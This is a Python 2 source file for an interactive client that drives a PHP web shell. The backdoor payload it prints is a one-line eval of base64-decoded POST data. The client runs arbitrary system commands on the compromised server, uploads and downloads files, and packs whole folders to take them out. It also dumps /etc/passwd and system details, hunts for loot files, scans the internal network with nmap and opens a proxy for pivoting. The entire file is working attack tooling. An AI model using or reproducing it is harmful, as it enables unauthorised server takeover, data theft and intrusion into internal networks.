
import base64
from cmd import Cmd
import os
import re
import request
from hashlib import sha512
import proxy


def extract_ip_mask_ifconfig(addr_line):
    ip = re.findall(r"inet addr:\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}", addr_line)
    if ip and len(ip[0].split(":")) > 1:
        ip = ip[0].split(":")[1]
    mask = re.findall(r"Mask:\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}", addr_line)
    bits = 0
    if mask and len(mask[0].split(":")) > 1:
        mask = mask[0].split(":")[1]
        import math
        octets = mask.split(".")
        for o in octets:
            mo = int(o)
            if mo > 0:
                bits += int(math.log(mo, 2)) + 1
    return (ip, bits)


def is_private_ip(ip):
    octets = ip.split(".")
    f = False
    if len(octets) == 4:
        o1 = int(octets[0])
        o2 = int(octets[1])
        if o1 == 10:
            f = True
        elif o1 == 172 and (o2 >= 16 and o2 <= 31):
            f = True
        elif o1 == 192 and o2 == 168:
            f = True
        elif o1 == 169 and o2 == 254:
            f = True
        else:
            f = False
    return f


class rshell(Cmd):

    pwd = ""
    old_pwd = ""
    ips = {}
    hosts = {}
    width = 80
    proxy_object = None

    def __init__(self, shell_url, proxy):
        Cmd.__init__(self)
        self.shell_url = shell_url
        self.proxy = proxy

    def log_data(cmd, data):
        f = open(cmd.split()[0], "w")
        f.write(data)
        f.close()

    def do_help(self, line):
        print " " * 15, "help: Show this message\n"
        print " " * 15, "payload: show the shell code in php\n"
        print " " * 15, "download: download remotepath/remotefile localpath/localfile\n"
        print " " * 15, "upload: upload localpath/localfile remotepath/remotefile\n"
        print " " * 15, "compress_folder: compress_folder folder_path file.tar.gz\n"
        print " " * 15, "dwfolder: do_dwfolder folder_path\n"
        print " " * 15, "getsysinfo: get info about the system\n"
        print " " * 15, "getswversion: get versions of some software\n"
        print " " * 15, "check_files: check existence of a list of files (pillage.lst)\n"
        print " " * 15, "get_local_ips: get local ips and subnet mask bits\n"
        print " " * 15, "print_local_ips: print local ips finded\n"
        print " " * 15, "find_hosts: find hosts in local network using nmap\n"
        print " " * 15, "print_hosts [ip]: print finded hosts info\n"
        print " " * 15, "start_proxy: starts a proxy on localhost:8888, set that in your browser and surf the internal network\n"
        print " " * 15, "stop_proxy: stops the proxy server\n"
        print " " * 15, "Or write a command to send to the server shell\n"

        return None

    def default(self, line):
        """
        This is the default command method
        php system function is called with
        the command to execute
        :param line: php command to execute using system function
        """
        cmd = "system('{0}');".format(line)
        #doing the request to the server
        (code, response) = self.dorequest(cmd)
        if code == 200:
            print response

    def emptyline(self):
        print "type help or ? to get help"

    def do_quit(self, line):
        """
        Return true to exit in postcmd

        :param line:
        :return: Boolean
        """
        self.do_stop_proxy(line)
        return True

    def postcmd(self, stop, line):
        """
        This stop cmdloop if returns true
        check if stop value is true
        stop is the return value of do_* methods
        :param stop: Boolean
        :param line:
        :return: stop
        """
        return stop

    def do_exit(self, line):
        """
        Return true to exit in postcmd

        :param line:
        :return: Boolean
        """
        self.do_stop_proxy(line)
        return True

    def dorequest(self, php_cmd):
        #Post request using the param parameter
        """
        Make a request to the server sending the php code
        :param php_cmd: php code to execute on the server
        :return: tuple, the http code and the html result of the request
        """
        cmd_base64 = base64.encodestring(php_cmd)[:-1]
        full_url = self.shell_url
        #parsed_url = urlparse(full_url)
        #url = ''
        #con = None
        params = "param={0}".format(cmd_base64)
        return 200, request.do_request(full_url, params, self.proxy)

    def do_shell(self, line):
        #This method execute the command locally
        print os.popen(line).read()
        return None

    def do_payload(self, line):
        self.print_payload()
        return None

    def do_phpinfo(self, line):
        #This is the default command method
        #system function is called with the command to execute
        #doing the request to the server
        cmd = "phpinfo();"
        (code, data) = self.dorequest(cmd)
        if code == 200:
            phpinfofilename = "phpinfo.html"
            f = file(phpinfofilename, "w")
            f.write(data)
            f.close()
            resp = raw_input("Open in default browser? (y/n): ")
            if resp == "y":
                import webbrowser
                webbrowser.open(phpinfofilename)
        else:
            print "Error"
        return None

    def print_payload(self):
        print "<?php eval(base64_decode($_POST['param'])); ?>"

    def do_download(self, line):
        files = line.split()
        #Return file contents encoded in base 64
        cmd = "echo base64_encode(file_get_contents('{0}'));".format(files[0])
        (code, data) = self.dorequest(cmd)
        if code == 200:
            f = file(os.path.basename(files[0]), "w")
            #Decode data and write it in a file
            f.write(base64.decodestring(data))
            f.close()
        else:
            print "Error"
        return None

    def do_upload(self, line):
        (filename, destination) = line.split()
        f = file(filename)
        f_name = os.path.basename(filename)
        #Encode file data in base 64
        data = base64.encodestring(f.read()).replace("\n", "")
        f.close()
        #Building the command in remote server to decode base 64
        # and write the data in the file
        cmd = "file_put_contents('{0}/{1}',base64_decode('{2}'));"
        (code, data) = self.dorequest(cmd.format(destination, f_name, data))
        if code == 200:
            print data
        else:
            print "Error"
        return None

    def do_compress_folder(self, line):
        (folder, archivo) = line.split()
        cmd = "tar -czf {0} {1}".format(archivo, folder)
        self.default(cmd)
        return None

    def do_dwfolder(self, line):
        if line[-1:] == "/":
            line = line[-1]
        filename = "{0}.tar.gz".format(os.path.basename(line))
        self.do_compress_folder("{0} {1}".format(line, filename))
        self.do_download("{0} {1}".format(filename, filename))
        return None

    def do_getsysinfo(self, line):
        #Print user and system information
        cmds = {"User name:": "whoami",
                "User id:": "id",
                "/etc/passwd:": "cat /etc/passwd",
                "/etc/issue:": "cat /etc/issue",
                "Host name:": "hostname -f",
                "System information (uname):": "uname -a",
                "Network iterfaces:": "ifconfig -a",
                "/etc/resolv.conf:": "cat /etc/resolv.conf",
                "Hosts ips information /etc/hosts:": "cat /etc/hosts",
                "Open ports": "netstat -ant",
                }
        for k, val in cmds.items():
            print "=" * self.width
            print k
            print "-" * self.width
            self.default(val)
        return None

    def do_getswversion(self, line):
        #Print some software versions
        cmds = {"gcc": "gcc --version",
                "mysql": "mysql --version",
                "perl": "perl -v Returns",
                "ruby": "ruby -v Returns",
                "python": "python --version",
                }
        print "=" * self.width
        print "Software versions:"
        for k, val in cmds.items():
            print "-" * self.width
            self.default(val)
        return None

    def file_exists(self, filename):
        cmd = "if (file_exists('{0}')) echo 1;".format(filename)
        (code, response) = self.dorequest(cmd)
        if code == 200:
            if response.replace("\n", "") == "1":
                print filename + " exist"
        else:
            print "Error"

    def do_check_files(self, line):
        """
            pillage.lst from pwnwiki (https://github.com/pwnwiki)
        """
        file_list = file("pillage.lst")
        for filename in file_list:
            #Check filename, [:-1] to remove eol from readline
            self.file_exists(filename[:-1])
        file_list.close()
        return None

    def do_get_local_ips(self, line):
        cmd = "system('ifconfig -a | grep addr:');"
        (code, response) = self.dorequest(cmd)
        if code == 200:
            if response and response != "":
                addr_list = response.split("\n")
                for addr_line in addr_list:
                    (ip, bits) = extract_ip_mask_ifconfig(addr_line)
                    if ip and bits:
                        self.ips[ip] = {"mask_bits": bits}
                print self.ips
        else:
            print "Error"
        return None

    def do_print_local_ips(self, line):
        for ip, info in self.ips.items():
            print "=" * self.width
            print "{0}:".format(ip)
            print "mask bits: {0}".rjust(16).format(info["mask_bits"])
        return None

    def do_find_hosts(self, line):
        cmd = "nmap "
        if self.ips:
            for ip, info in self.ips.items():
                if not ip.startswith("127."):
                    cmd += "{0}/{1} ".format(ip, info["mask_bits"])
            #cmd = "nmap 127.0.0.1"
            (code, response) = self.dorequest("system('{0}');".format(cmd))
            if code == 200:
                scans = response.split("Nmap scan report for ")[1:]
                for host in scans:
                    hs = host.split("\n\n")[0]
                    lhs = hs.split("\n")
                    if len(lhs[0].split()) > 1:
                        hostname = lhs[0].split()[0]
                        ip = lhs[0].split()[1][1:-1]
                    else:
                        ip = lhs[0]
                        hostname = ""
                    ports = lhs[4:]
                    self.hosts[ip] = [hostname, ports]
            else:
                print "Error"
        else:
            print "You must run get_local_ips first"
        self.do_print_hosts(None)
        return None

    def do_print_hosts(self, line):
        if line:
            host = self.hosts[line.split()[0]]
            print "Host name: {0}".format(host[0])
            for port in host[1]:
                print port
        else:
            for host, info in self.hosts.items():
                print " "
                print "IP: {0}".format(host)
                print "Host name: {0}".format(info[0])
                for port in info[1]:
                    print port

    def do_start_proxy(self, line):
        """Start a proxy server on the port
        """
        self.proxy_object = proxy.Proxy()
        print "Starting proxy on {0}:{1}".format(self.proxy_object.port,
                                                 self.proxy_object.host)
        self.proxy_object.set_shell_url(self.shell_url)
        self.proxy_object.start()
        print ""
        return None

    def do_stop_proxy(self, line):
        if self.proxy_object:
            self.proxy_object.terminate()
            self.proxy_object.join()

    def do_set_password(self, line):
        a = sha512(line)
        print a.hexdigest()

#    def do_cd(self, line):
#        cmd = "cd ../; pwd"
#        self.default(cmd)
